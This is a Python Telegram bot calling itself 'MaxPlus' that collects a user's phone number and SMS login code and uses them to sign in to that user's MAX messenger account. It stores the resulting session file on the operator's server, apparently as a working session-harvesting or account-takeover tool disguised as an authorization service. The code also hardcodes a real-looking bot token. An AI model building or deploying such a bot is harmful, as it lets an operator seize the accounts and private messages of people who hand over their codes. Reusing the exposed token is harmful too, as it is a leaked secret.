import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message
from pymax import Client, ExtraConfig

BOT_TOKEN = "8983059538:AAF1XQEkuwmvYreLN2csBfYrRW8NBQ9pwuc"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
pending = {}  # user_id -> {"provider": ..., "phone": ...}
waiting_code = set()  # user_id тех, кто должен ввести код

class TelegramSmsProvider:
    def __init__(self):
        self._queue = asyncio.Queue()

    async def set_code(self, code: str):
        await self._queue.put(code)

    async def get_code(self, phone: str) -> str:
        return await self._queue.get()

@dp.message(Command("start"))
async def start_cmd(msg: Message):
    await msg.answer(
        "👋 MaxPlus — авторизация MAX\n\n"
        "Отправь номер в формате +79161234567"
    )

@dp.message(F.text, ~F.text.startswith("/"))
async def phone_handler(msg: Message):
    phone = msg.text.strip()

    # Если пользователь сейчас должен ввести код
    if msg.from_user.id in waiting_code:
        return await code_as_reply(msg)

    if not phone.startswith("+") or len(phone) != 12:
        return await msg.answer("❌ Формат: +79161234567")

    sms_provider = TelegramSmsProvider()
    client = Client(
        phone=phone,
        work_dir="cache",
        session_name=f"{phone}.db",
        sms_code_provider=sms_provider,
        extra_config=ExtraConfig(log_level="INFO"),
    )

    asyncio.create_task(run_client(msg, client, phone, sms_provider))

    await msg.answer(
        f"📤 SMS-код отправлен на номер {phone}. Ожидайте сообщение в течение минуты."
    )
    await asyncio.sleep(1.5)
    waiting_code.add(msg.from_user.id)
    second_msg = await msg.answer("📩 Введите код из SMS ответом на это сообщение:")

async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
    try:
        pending[msg.from_user.id] = {"provider": sms_provider, "phone": phone}
        await client.start()
        waiting_code.discard(msg.from_user.id)
        await msg.answer(f"✅ {phone} авторизован!\nСессия: cache/{phone}.db")
    except Exception as e:
        waiting_code.discard(msg.from_user.id)
        error_text = str(e).lower()
        error_name = type(e).__name__.lower()

        if "auth" in error_name or "code" in error_text or "token" in error_text:
            await msg.answer("❌ Неверный код или номер заблокирован")
        elif "connect" in error_name or "network" in error_text or "timeout" in error_text:
            await msg.answer("❌ Проблемы с сетью. Попробуй позже")
        elif "already" in error_text or "session" in error_text:
            await msg.answer("ℹ️ Этот номер уже авторизован")
        else:
            await msg.answer(f"❌ Ошибка: {e}")
    finally:
        pending.pop(msg.from_user.id, None)

async def code_as_reply(msg: Message):
    """Обрабатывает код, отправленный как обычное сообщение"""
    if msg.from_user.id not in pending:
        waiting_code.discard(msg.from_user.id)
        return await msg.answer("❌ Сессия устарела. Отправь номер заново")

    code = msg.text.strip()
    if not code.isdigit():
        return await msg.answer("❌ Код должен состоять только из цифр")

    data = pending[msg.from_user.id]
    provider = data["provider"]
    waiting_code.discard(msg.from_user.id)
    await provider.set_code(code)
    await msg.answer("✅ Код принят, авторизую...")

@dp.message(Command("code"))
async def code_handler(msg: Message):
    """Оставлен для совместимости, но основной ввод — ответом на второе сообщение"""
    if msg.from_user.id not in pending:
        return await msg.answer("❌ Сначала отправь номер")

    code = msg.text.split()[1] if len(msg.text.split()) > 1 else None
    if not code or not code.isdigit():
        return await msg.answer("❌ Используй: /code 12345")

    data = pending[msg.from_user.id]
    provider = data["provider"]
    waiting_code.discard(msg.from_user.id)
    await provider.set_code(code)
    await msg.answer("✅ Код принят, авторизую...")

async def main():
    print("Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
